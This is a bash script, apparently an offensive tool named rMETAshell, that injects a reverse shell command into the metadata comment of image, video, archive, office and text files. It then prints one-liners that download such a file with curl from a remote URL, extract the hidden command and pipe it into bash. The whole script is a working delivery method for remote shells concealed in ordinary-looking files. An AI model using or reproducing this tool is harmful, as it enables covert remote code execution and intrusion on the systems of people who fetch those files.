#!/bin/bash
#
# rMETAshell - A reverse shell metadata injection
# and one-liner generator tool!
# 
# From: LoxoSec with ❤️
# git5
# ------------------------------------------------
# Github
# https://github.com/git5loxosec
# ------------------------------------------------
# Website
# https://www.LoxoSec.rf.gd
# ------------------------------------------------
# Whatsapp group (Latin/Hispanic/International)
# https://chat.whatsapp.com/Iv7lplJVgM16FeuIzKhFxj
# ------------------------------------------------
# X
# https://x.com/git5loxosec
# ------------------------------------------------

show_help() {
    echo "Usage: $0 [OPTIONS] <REVERSE_SHELL_COMMAND> <FILE_PATH>"
    echo "Inject a reverse shell command into supported file types and generate a one-liner execution method."
    echo ""
    echo "Options:"
    echo "  -h, --help           Display this help message."
    echo ""
    echo "Arguments:"
    echo "  <REVERSE_SHELL_COMMAND> The reverse shell command to inject."
    echo "  <FILE_PATH>          The path to the file (jpg, jpeg, png, mp4, html, htm, zip, rar, pdf, doc, xls, ppt, docx, pptx, xlsx, txt)."
    echo ""
}

inject_metadata() {
    local file="$1"
    local command="$2"
    
    case "$file" in
        *.jpg|*.jpeg|*.png|*.mp4|*.html|*.htm|*.zip|*.rar|*.pdf|*.doc|*.xls|*.ppt|*.docx|*.pptx|*.xlsx|*.txt)
            exiftool -Comment="$command" "$file"
            ;;
        *)
            echo "Error: Unsupported file type. Supported types are: jpg, jpeg, png, mp4, html, htm, zip, rar, pdf, doc, xls, ppt, docx, pptx, xlsx, txt."
            exit 1
            ;;
    esac
}

generate_one_liner() {
    local file="$1"
    local base_url="$2"
    
    case "$file" in
        *.jpg|*.jpeg|*.png)
            echo "Supported Extensions: jpg, jpeg, png"
            echo "Generated one-liner: curl -s '$base_url/$file' | exiftool -Comment -b - | bash"
            ;;
        *.mp4)
            echo "Supported Extension: mp4"
            echo "Generated one-liner: curl -s '$base_url/$file' | exiv2 -Comment -b - | bash"
            ;;
        *.html|*.htm)
            echo "Supported Extensions: html, htm"
            echo "Generated one-liner: curl -s '$base_url/$file' | grep -o '<!--.*-->' | bash"
            ;;
        *.zip)
            echo "Supported Extension: zip"
            echo "Generated one-liner: curl -s '$base_url/$file' | unzip -p - | grep -o 'Comment: .*' | bash"
            ;;
        *.rar)
            echo "Supported Extension: rar"
            echo "Generated one-liner: curl -s '$base_url/$file' | unrar p -p- | grep -o 'Comment: .*' | bash"
            ;;
        *.pdf|*.doc|*.xls|*.ppt|*.docx|*.pptx|*.xlsx)
            echo "Supported Extensions: pdf, doc, xls, ppt, docx, pptx, xlsx"
            echo "Generated one-liner: curl -s '$base_url/$file' | exiftool -Comment -b - | bash"
            ;;
        *.txt)
            echo "Supported Extension: txt"
            echo "Generated one-liner: curl -s '$base_url/$file' | grep -o 'Comment: .*' | bash"
            ;;
        *)
            echo "Error: Unsupported file type. Supported types are: jpg, jpeg, png, mp4, html, htm, zip, rar, pdf, doc, xls, ppt, docx, pptx, xlsx, txt."
            exit 1
            ;;
    esac
}

if [ "$1" == "-h" ] || [ "$1" == "--help" ]; then
    show_help
    exit 0
fi

if [ $# -lt 2 ]; then
    echo "Error: Invalid number of arguments."
    show_help
    exit 1
fi

command="$1"
file_path="$2"
file_name=$(basename "$file_path")

inject_metadata "$file_path" "$command"

read -p "Enter the base URL for remote files (e.g., http://www.example.com): " base_url

generate_one_liner "$file_name" "$base_url"
